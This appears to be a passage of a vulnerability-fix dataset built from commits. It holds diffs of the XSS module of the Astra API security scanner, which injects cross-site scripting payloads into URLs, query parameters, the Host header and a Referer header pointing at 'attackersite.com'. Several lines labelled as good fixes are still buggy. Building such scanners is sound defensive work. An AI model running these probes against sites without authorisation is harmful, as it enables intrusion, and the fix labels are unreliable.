                            "diff": "\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "        if 'application/json' or 'text/plain' in xss_request['Content-Type']:"
                            ],
                            "goodparts": [
                                "        if 'application/json' or 'text/plain' in res_headers['Content-Type']:"
                            ]
                        },
                        {
                            "diff": "\n     return impact\n \n \n+def xss_http_headers(url,method,headers,body,scanid=None):\n+    # This function checks different header based XSS.\n+    # XSS via Host header (Limited to IE)\n+    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n+    temp_headers = {}\n+    temp_headers.update(headers)\n+    xss_payloads = fetch_xss_payload()\n+    for payload in xss_payloads:\n+        parse_domain = urlparse.urlparse(url).netloc\n+        host_header = {\"Host\" : parse_domain + '/' + payload}\n+        headers.update(host_header)\n+        host_header_xss = req.api_request(url, \"GET\", headers)\n+        if host_header_xss.text.find(payload) != -1:\n+            impact = \"Low\"\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            dbupdate.insert_record(xss_http_headers)\n+            break\n+\n+    # Test for Referer based XSS \n+    for payload in xss_payloads:\n+        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header = {\"Referer\" : referer_header_value}\n+        temp_headers.update(referer_header)\n+        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n+        if ref_header_xss.text.find(payload) != -1:\n+            impact = check_xss_impact(temp_headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n+            break\n+\n+\n def xss_get_url(url,method,headers,body,scanid=None):\n-    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n-    xss_result = ''\n+    # Check for URL based XSS. \n+    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n+    result = ''\n     xss_payloads = fetch_xss_payload()\n     uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n     for uri_list in uri_check_list:\n",
                            "add": 36,
                            "remove": 2,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "    xss_result = ''"
                            ],
                            "goodparts": [
                                "def xss_http_headers(url,method,headers,body,scanid=None):",
                                "    temp_headers = {}",
                                "    temp_headers.update(headers)",
                                "    xss_payloads = fetch_xss_payload()",
                                "    for payload in xss_payloads:",
                                "        parse_domain = urlparse.urlparse(url).netloc",
                                "        host_header = {\"Host\" : parse_domain + '/' + payload}",
                                "        headers.update(host_header)",
                                "        host_header_xss = req.api_request(url, \"GET\", headers)",
                                "        if host_header_xss.text.find(payload) != -1:",
                                "            impact = \"Low\"",
                                "            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}",
                                "            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)",
                                "            dbupdate.insert_record(xss_http_headers)",
                                "            break",
                                "    for payload in xss_payloads:",
                                "        referer_header_value = 'http://attackersite.com?test='+payload",
                                "        referer_header = {\"Referer\" : referer_header_value}",
                                "        temp_headers.update(referer_header)",
                                "        ref_header_xss = req.api_request(url, \"GET\", temp_headers)",
                                "        if ref_header_xss.text.find(payload) != -1:",
                                "            impact = check_xss_impact(temp_headers)",
                                "            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)",
                                "            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}",
                                "            dbupdate.insert_record(attack_result)",
                                "            break",
                                "    result = ''"
                            ]
                        },
                        {
                            "diff": "\n \n     for payload in xss_payloads:\n             xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact(xss_request_url.headers)\n-                xss_result = True\n+            if result is not True:\n+                if xss_request_url.text.find(payload) != -1:\n+                    impact = check_xss_impact(xss_request_url.headers)\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+                    dbupdate.insert_record(attack_result)\n+                    result = True\n \n             xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n             if xss_request_url.text.find(payload) != -1:\n                 impact = check_xss_impact()\n-                xss_result = True\n-\n-            if xss_result is True:\n                 print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n-                return\n+                \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n-    # Test for XSS in GET param\n+    # This function checks for URI based XSS. \n+    # http://localhost/?firstname=<payload>&lastname=<payload>\n     db_update = ''\n     vul_param = ''\n     url_query = urlparse.urlparse(url)\n",
                            "add": 10,
                            "remove": 9,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "            if xss_request_url.text.find(payload) != -1:",
                                "                impact = check_xss_impact(xss_request_url.headers)",
                                "                xss_result = True",
                                "                xss_result = True",
                                "            if xss_result is True:",
                                "                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}",
                                "                return"
                            ],
                            "goodparts": [
                                "            if result is not True:",
                                "                if xss_request_url.text.find(payload) != -1:",
                                "                    impact = check_xss_impact(xss_request_url.headers)",
                                "                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}",
                                "                    dbupdate.insert_record(attack_result)",
                                "                    result = True",
                                "                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}"
                            ]
                        },
                        {
                            "diff": "\n                     # check for URI based XSS\n                     # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                     if result is not True:\n-                        print \"param to test\",key\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        print xss_request.text\n                         if xss_request.text.find(payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n",
                            "add": 0,
                            "remove": 2,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "                        print \"param to test\",key",
                                "                        print xss_request.text"
                            ],
                            "goodparts": []
                        },
                        {
                            "diff": "\n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n-        print \"all params\",vul_param\n+        if vul_param:\n+            # Update all vulnerable params to db.\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n",
                            "add": 3,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "        print \"all params\",vul_param"
                            ],
                            "goodparts": [
                                "        if vul_param:",
                                "            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})"
                            ]
                        }
                    ],
                    "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) ",
                    "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    xss_result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                xss_result = True\n\n            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact()\n                xss_result = True\n\n            if xss_result is True:\n                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                dbupdate.insert_record(attack_result)\n                return\n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        print \"param to test\",key\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        print xss_request.text\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        print \"all params\",vul_param\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n        #xss_http_headers(url,method,headers,body,scanid)"
                }
            },
            "msg": "changes in xss_http_headers function"
        },
        "1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1",
            "sha": "1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1",
            "keyword": "XSS change",
            "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 36137f2..93dafcb 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -3,6 +3,7 @@\n import sendrequest as req\n import utils.logs as logs\n import urlparse\n+import time\n \n from utils.logger import logger\n from utils.db import Database_update\n@@ -29,7 +30,7 @@ def fetch_xss_payload():\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n@@ -40,9 +41,43 @@ def check_xss_impact(res_headers):\n     return impact\n \n \n+def xss_http_headers(url,method,headers,body,scanid=None):\n+    # This function checks different header based XSS.\n+    # XSS via Host header (Limited to IE)\n+    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n+    temp_headers = {}\n+    temp_headers.update(headers)\n+    xss_payloads = fetch_xss_payload()\n+    for payload in xss_payloads:\n+        parse_domain = urlparse.urlparse(url).netloc\n+        host_header = {\"Host\" : parse_domain + '/' + payload}\n+        headers.update(host_header)\n+        host_header_xss = req.api_request(url, \"GET\", headers)\n+        if host_header_xss.text.find(payload) != -1:\n+            impact = \"Low\"\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            dbupdate.insert_record(xss_http_headers)\n+            break\n+\n+    # Test for Referer based XSS \n+    for payload in xss_payloads:\n+        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header = {\"Referer\" : referer_header_value}\n+        temp_headers.update(referer_header)\n+        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n+        if ref_header_xss.text.find(payload) != -1:\n+            impact = check_xss_impact(temp_headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n+            break\n+\n+\n def xss_get_url(url,method,headers,body,scanid=None):\n-    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n-    xss_result = ''\n+    # Check for URL based XSS. \n+    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n+    result = ''\n     xss_payloads = fetch_xss_payload()\n     uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n     for uri_list in uri_check_list:\n@@ -56,23 +91,24 @@ def xss_get_url(url,method,headers,body,scanid=None):\n \n     for payload in xss_payloads:\n             xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact(xss_request_url.headers)\n-                xss_result = True\n+            if result is not True:\n+                if xss_request_url.text.find(payload) != -1:\n+                    impact = check_xss_impact(xss_request_url.headers)\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+                    dbupdate.insert_record(attack_result)\n+                    result = True\n \n             xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n             if xss_request_url.text.find(payload) != -1:\n                 impact = check_xss_impact()\n-                xss_result = True\n-\n-            if xss_result is True:\n                 print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n-                return\n+                \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n-    # Test for XSS in GET param\n+    # This function checks for URI based XSS. \n+    # http://localhost/?firstname=<payload>&lastname=<payload>\n     db_update = ''\n     vul_param = ''\n     url_query = urlparse.urlparse(url)\n@@ -87,11 +123,9 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n                     # check for URI based XSS\n                     # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                     if result is not True:\n-                        print \"param to test\",key\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        print xss_request.text\n                         if xss_request.text.find(payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n@@ -111,7 +145,9 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n-        print \"all params\",vul_param\n+        if vul_param:\n+            # Update all vulnerable params to db.\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n@@ -119,4 +155,5 @@ def xss_check(url,method,headers,body,scanid):\n     if method == 'GET' or method == 'DEL':\n         xss_get_uri(url,method,headers,body,scanid)\n         xss_get_url(url,method,headers,body,scanid)\n-        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    \n+    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n",
            "message": "",
            "files": {
                "/modules/xss.py": {
                    "changes": [
                        {
                            "diff": "\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "        if 'application/json' or 'text/plain' in xss_request['Content-Type']:"
                            ],
                            "goodparts": [
                                "        if 'application/json' or 'text/plain' in res_headers['Content-Type']:"
                            ]
                        },
                        {
                            "diff": "\n     return impact\n \n \n+def xss_http_headers(url,method,headers,body,scanid=None):\n+    # This function checks different header based XSS.\n+    # XSS via Host header (Limited to IE)\n+    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n+    temp_headers = {}\n+    temp_headers.update(headers)\n+    xss_payloads = fetch_xss_payload()\n+    for payload in xss_payloads:\n+        parse_domain = urlparse.urlparse(url).netloc\n+        host_header = {\"Host\" : parse_domain + '/' + payload}\n+        headers.update(host_header)\n+        host_header_xss = req.api_request(url, \"GET\", headers)\n+        if host_header_xss.text.find(payload) != -1:\n+            impact = \"Low\"\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            dbupdate.insert_record(xss_http_headers)\n+            break\n+\n+    # Test for Referer based XSS \n+    for payload in xss_payloads:\n+        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header = {\"Referer\" : referer_header_value}\n+        temp_headers.update(referer_header)\n+        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n+        if ref_header_xss.text.find(payload) != -1:\n+            impact = check_xss_impact(temp_headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n+            break\n+\n+\n def xss_get_url(url,method,headers,body,scanid=None):\n-    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n-    xss_result = ''\n+    # Check for URL based XSS. \n+    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n+    result = ''\n     xss_payloads = fetch_xss_payload()\n     uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n     for uri_list in uri_check_list:\n",
                            "add": 36,
                            "remove": 2,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "    xss_result = ''"
                            ],
                            "goodparts": [
                                "def xss_http_headers(url,method,headers,body,scanid=None):",
                                "    temp_headers = {}",
                                "    temp_headers.update(headers)",
                                "    xss_payloads = fetch_xss_payload()",
                                "    for payload in xss_payloads:",
                                "        parse_domain = urlparse.urlparse(url).netloc",
                                "        host_header = {\"Host\" : parse_domain + '/' + payload}",
                                "        headers.update(host_header)",
                                "        host_header_xss = req.api_request(url, \"GET\", headers)",
                                "        if host_header_xss.text.find(payload) != -1:",
                                "            impact = \"Low\"",
                                "            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}",
                                "            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)",
                                "            dbupdate.insert_record(xss_http_headers)",
                                "            break",
                                "    for payload in xss_payloads:",
                                "        referer_header_value = 'http://attackersite.com?test='+payload",
                                "        referer_header = {\"Referer\" : referer_header_value}",
                                "        temp_headers.update(referer_header)",
                                "        ref_header_xss = req.api_request(url, \"GET\", temp_headers)",
                                "        if ref_header_xss.text.find(payload) != -1:",
                                "            impact = check_xss_impact(temp_headers)",
                                "            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)",
                                "            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}",
                                "            dbupdate.insert_record(attack_result)",
                                "            break",
                                "    result = ''"
                            ]
                        },
                        {
                            "diff": "\n \n     for payload in xss_payloads:\n             xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact(xss_request_url.headers)\n-                xss_result = True\n+            if result is not True:\n+                if xss_request_url.text.find(payload) != -1:\n+                    impact = check_xss_impact(xss_request_url.headers)\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+                    dbupdate.insert_record(attack_result)\n+                    result = True\n \n             xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n             if xss_request_url.text.find(payload) != -1:\n                 impact = check_xss_impact()\n-                xss_result = True\n-\n-            if xss_result is True:\n                 print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n-                return\n+                \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n-    # Test for XSS in GET param\n+    # This function checks for URI based XSS. \n+    # http://localhost/?firstname=<payload>&lastname=<payload>\n     db_update = ''\n     vul_param = ''\n     url_query = urlparse.urlparse(url)\n",
                            "add": 10,
                            "remove": 9,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "            if xss_request_url.text.find(payload) != -1:",
                                "                impact = check_xss_impact(xss_request_url.headers)",
                                "                xss_result = True",
                                "                xss_result = True",
                                "            if xss_result is True:",
